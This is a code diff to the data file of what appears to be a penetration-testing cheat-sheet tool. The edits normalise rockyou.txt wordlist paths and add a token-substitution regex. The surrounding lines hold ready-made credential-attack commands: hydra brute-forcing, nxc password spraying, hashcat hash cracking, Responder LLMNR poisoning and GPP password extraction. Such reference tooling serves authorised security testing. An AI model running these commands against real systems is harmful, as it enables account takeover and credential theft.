@@ -617,7 +617,7 @@ const DATA=[
    notes:["Adapt <b>&lt;path&gt;</b>, <b>&lt;params&gt;</b> and the <b>&lt;fail_string&gt;</b>."],
    steps:[
      {needs:[], t:"POST form (hydra)", c:"hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {IP} http-post-form \"<path>:<params>:<fail_string>\""},
-     {needs:[], t:"Basic auth", c:"hydra -L users.txt -P rockyou.txt {IP} http-get /<path>"},
+     {needs:[], t:"Basic auth", c:"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {IP} http-get /<path>"},
    ]},
   {id:"wordpress", port:"WEB", svc:"CMS", title:"WordPress",
    notes:["If WordPress detected: wpscan first."],
@@ -652,7 +652,7 @@ const DATA=[
      {needs:["USER"], t:"Password spraying (1 password, N users - watch out for lockout)", c:"nxc smb {IP} -u users.txt -p 'Saison2025!' --continue-on-success | grep '[+]'"},
      {needs:["USER"], t:"Spray username = password", c:"nxc smb {IP} -u users.txt -p users.txt --no-bruteforce --continue-on-success"},
      {needs:["USER"], t:"Crack harvested AS-REP / Kerberoast", c:"hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt   # AS-REP\nhashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt    # TGS"},
-     {needs:[], t:"LLMNR/NBT-NS poisoning (NetNTLMv2 capture)", c:"sudo responder -I <iface> -dwv\n# then: hashcat -m 5600 hashes.txt rockyou.txt"},
+     {needs:[], t:"LLMNR/NBT-NS poisoning (NetNTLMv2 capture)", c:"sudo responder -I <iface> -dwv\n# then: hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt"},
      {needs:["AUTH"], t:"GPP cpassword (SYSVOL, decryptable)", c:"nxc smb {DC} -u {USER} -p {PASS} -M gpp_password\nnxc smb {DC} -u {USER} -p {PASS} -M gpp_autologin"},
    ]},
   {id:"adenum", port:"AD", svc:"enum", title:"Domain enumeration (authenticated)",
@@ -816,6 +816,7 @@ function renderCmd(raw){
      .replace(/&lt;listener_ip&gt;/g,'<span class="tok" data-tok="LHOST"></span>')
      .replace(/&lt;iface&gt;/g,'<span class="tok" data-tok="IFACE"></span>')
      .replace(/\/usr\/share\/wordlists\/rockyou\.txt/g,'<span class="tok" data-tok="WORDLIST"></span>')
+     .replace(/\brockyou\.txt/g,'<span class="tok" data-tok="WORDLIST"></span>')
      .replace(/\{WORDLIST\}/g,'<span class="tok" data-tok="WORDLIST"></span>');
   return s;
 }
